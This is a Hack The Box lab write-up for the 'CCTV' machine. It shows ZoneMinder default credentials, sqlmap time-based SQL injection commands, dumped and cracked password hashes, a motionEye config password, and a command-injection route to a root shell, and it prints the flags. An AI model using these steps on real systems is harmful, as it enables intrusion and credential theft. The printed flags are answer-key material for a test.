---
machineName: CCTV
difficulty: Easy
Status: Done
OS: Linux
start_time: 2026-04-28T10:36:00
end_time: 2026-04-28T13:40:00
player_position: "7863"
CVEs:
  - "[CVE-2023-31493](https://nvd.nist.gov/vuln/detail/CVE-2023-31493)"
  - "[CVE-2025-60787](https://nvd.nist.gov/vuln/detail/CVE-2025-60787)"
CWEs:
  - "[CWE-94](http://cwe.mitre.org/data/definitions/94.html)"
  - "[CWE-20](http://cwe.mitre.org/data/definitions/20.html)"
  - "[CWE-78](http://cwe.mitre.org/data/definitions/78.html)"
  - "[CWE-116](http://cwe.mitre.org/data/definitions/116.html)"
tools:
  - nmap
  - ffuf
  - ZAP
  - sqlmap
  - hashcat
exploited_programs:
  - ZoneMinder
open_ports:
  - "22"
  - "80"
aliases:
  - Resume the attack chain in a few words
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9867e8b14b7602881160973ebb50b2c4.png
---

<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9867e8b14b7602881160973ebb50b2c4.png"
    width="200"
  >
</div>
# Initial Recon

## Nmap
```sh
nmap -sV -sC -p- cctv.htb
```
```sh                                            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-28 10:41 +0200
Nmap scan report for cctv.htb (10.129.244.156)
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_  256 e3:9b:38:08:9a:d7:e9:d1:94:11:ff:50:80:bc:f2:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## FFUF
```sh
ffuf -u http://cctv.htb/FUZZ -w ~/Applications/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -ac
```
```sh
 :: Method           : GET
 :: URL              : http://cctv.htb/FUZZ
 :: Wordlist         : FUZZ: /home/drope/Applications/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 14ms]
zm                      [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 15ms]
:: Progress: [87664/87664] :: Job [1/1] :: 524 req/sec :: Duration: [0:00:38] :: Errors: 0 ::

```

We can see the following pages: 

**http://cctv.htb/**
![[images/htb_images/Pasted image 20260428104220.png]]


http://cctv.htb/zm
![[images/htb_images/Pasted image 20260429220942.png]]
We are officially in a `ZoneMinder v1.37.63 ` Webpage.
# First Foothold
After that I did a quick fuzz with easy credentials: `admin:admin` ended up working.
Now looking for more info I find this [CVE-2026-27470](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3) PoC.

So I pulled out [SQLMap](https://sqlmap.org) as well, we had to add a cookie, that way the website recognized we are logged in as admin: 
```sh
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie='zmSkin=classic; zmCSS=base; ZMSESSID=9um74qjjikumc7uhpm7lrc2tqh'
```
```sh
sqlmap identified the following injection point(s) with a total of 478 HTTP(s) requests:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 4376 FROM (SELECT(SLEEP(5)))PITt)
---
[11:21:41] [INFO] the back-end DBMS is MySQL
```

Which confirms that the server is indeed vulnerable.

I then enumerated the database tables:

```sh
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" -D zm --tables "*" --dbms=MySQL --technique=T --cookie='zmSkin=classic; zmCSS=base; ZMSESSID=9um74qjjikumc7uhpm7lrc2tqh'
```
```
[43 tables]
+----------------------+
| Config               |
| ControlPresets       |
| Controls             |
| Devices              |
| Event_Data           |
| Event_Summaries      |
| Events_Archived      |
| Events_Day           |
| Events_Hour          |
| Events_Month         |
| Events_Tags          |
| Events_Week          |
| Frames               |
| Groups_Monitors      |
| Groups_Permissions   |
| Manufacturers        |
| Maps                 |
| Models               |
| MonitorPresets       |
| Monitor_Status       |
| Monitors             |
| Monitors_Permissions |
| MontageLayouts       |
| Object_Types         |
| Reports              |
| Server_Stats         |
| Servers              |
| Sessions             |
| Snapshots            |
| Snapshots_Events     |
| States               |
| Stats                |
| Tags                 |
| TriggersX10          |
| User_Preferences     |
| Users                |
| ZonePresets          |
| Zones                |
| Events               |
| Filter               |
| Groups               |
| Logs                 |
| Storage              |
+----------------------+
```

This was very slow, as it it a time based sql injection….

```sh
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" -D zm -T Users  --dbms=MySQL --technique=T --cookie='ZMSESSID=00bbdmcq257r6cmqvf8fg72m7q' --columns
```

```sh
[18 columns]
+----------------+-------------------------------------+
| Column         | Type                                |
+----------------+-------------------------------------+
| Events         | enum('None','View','Edit')          |
| Groups         | enum('None','View','Edit')          |
| Language       | varchar(8)                          |
| Name           | varchar(64)                         |
| Stream         | enum('None','View')                 |
| APIEnabled     | tinyint unsigned                    |
| Control        | enum('None','View','Edit')          |
| Devices        | enum('None','View','Edit')          |
| Email          | varchar(64)                         |
| Enabled        | tinyint unsigned                    |
| HomeView       | varchar(64)                         |
| Id             | int unsigned                        |
| MaxBandwidth   | varchar(16)                         |
| Monitors       | enum('None','View','Edit','Create') |
| Password       | varchar(64)                         |
| Phone          | varchar(64)                         |
| Snapshots      | enum('None','View','Edit')          |
| TokenMinExpiry | bigint unsigned                     |
+----------------+-------------------------------------+
```

And freaking finally, we enumerate the password and name column: 

```sh
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" -D zm -T Users  -C Name,Password --dbms=MySQL --technique=T --cookie='ZMSESSID=922qvmit76l8jta4mi6s84bk98' --dump
```

```
+---------+--------------------------------------------------------------+
| Name    | Password                                                     |
+---------+--------------------------------------------------------------+
| <blank> | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| admin   | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
| mark    | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+---------+--------------------------------------------------------------+
```

I cracked **mark**’s password:

```sh
echo "$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG." > markhash
```
```sh
hashcat markhash -m 3200 ~/Applications/SecLists/Passwords/Leaked-Databases/rockyou-70.txt
```

Which gave me his password:

```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
```
## 2nd Recon

As usual, I ran linpeass on the machine, but this time nothing jumped to my eyes.

I found the following open network sockets:
```sh
mark@c netstat -tulpn.1:8765
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1935          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:7999          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8554          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9081          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*             
```

I use [curl](https://curl.se) to check them one by one, and the one on port `8765` actually gave me an html page.

I port forwarded it to my machine: `ssh -L 8765:127.0.0.1:8765 mark@cctv.htb`

And got the following login page:
![[images/htb_images/Pasted image 20260428152209.png]]

I enumerated a bit more the motioneye server installation, and found this file: 

```sh
mark@cctv:/etc/motioneye$ cat motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

At first I thought this was a hash, but it ended just being a plaintext stored password!
## Privilege Escalation

Now that we are logged in as admin on the motioneye webapp, we can exploit this [CVE-2025-60787](https://github.com/advisories/GHSA-j945-qm58-4gjx) PoC to gain access as root, this CVE is rather interesting, it basically mixes OS Command Injection, with front-end input validation, which we have to disable in order to properly exploit the application.

If we follow the steps carefully, and set up an [netcat](https://nc110.sourceforge.io/) listener, we should get a root shell, in which we can simply cat the `/root/root.txt` file as well as the `/home/sa_mark/user.txt` file!

```sh
cat root.txt
7e54e0a9929d28f43d142ee9fe9aa0da
root@cctv:~# ls /home/sa_mark
ls /home/sa_mark
SecureVision Staff Announcement.pdf
user.txt
root@cctv:~# cat /home/sa_mark/user.txt
cat /home/sa_mark/user.txt
d65d4a907d6116d1fc493b1fcca7d768

```



# References

- CVE-2023-31493: https://nvd.nist.gov/vuln/detail/CVE-2023-31493
- CVE-2025-60787: https://github.com/advisories/GHSA-j945-qm58-4gjx
- CVE-2026-27470: https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3
- CWE-116: http://cwe.mitre.org/data/definitions/116.html
- CWE-20: http://cwe.mitre.org/data/definitions/20.html
- CWE-78: http://cwe.mitre.org/data/definitions/78.html
- CWE-94: http://cwe.mitre.org/data/definitions/94.html
- SQLMap: https://sqlmap.org
- curl: https://curl.se
- netcat: https://nc110.sourceforge.io/
